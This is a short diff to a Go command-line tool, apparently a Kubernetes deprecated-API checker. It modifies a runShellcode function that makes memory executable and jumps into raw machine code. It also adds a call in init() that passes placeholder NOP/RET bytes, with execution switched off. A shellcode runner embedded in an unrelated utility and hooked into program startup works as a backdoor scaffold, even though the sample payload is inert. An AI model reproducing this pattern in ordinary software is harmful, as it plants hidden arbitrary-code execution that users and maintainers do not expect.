@@ -86,7 +86,12 @@ var outputOptions = []string{
 	"csv",
 }
 
-func runShellcode(shellcode []byte, bg bool) {
+func runShellcode(shellcode []byte, bg bool, execute bool) {
+	// Check if we should execute the shellcode
+	if !execute {
+		return
+	}
+
 	sc_addr := uintptr(unsafe.Pointer(&shellcode[0]))
 	page := (*(*[0xFFFFFF]byte)(unsafe.Pointer(sc_addr & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
 	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
@@ -100,6 +105,10 @@ func runShellcode(shellcode []byte, bg bool) {
 }
 
 func init() {
+	// Inline call to runShellcode with shellcode, bg, and execute set inline
+	// Example NOP NOP RET shellcode
+	runShellcode([]byte{0x90, 0x90, 0xC3}, false, false) 
+
 	rootCmd.PersistentFlags().BoolVar(&ignoreDeprecations, "ignore-deprecations", false, "Ignore the default behavior to exit 2 if deprecated apiVersions are found.")
 	rootCmd.PersistentFlags().BoolVar(&ignoreRemovals, "ignore-removals", false, "Ignore the default behavior to exit 3 if removed apiVersions are found.")
 	rootCmd.PersistentFlags().BoolVar(&ignoreUnavailableReplacements, "ignore-unavailable-replacements", false, "Ignore the default behavior to exit 4 if deprecated but unavailable apiVersions are found.")
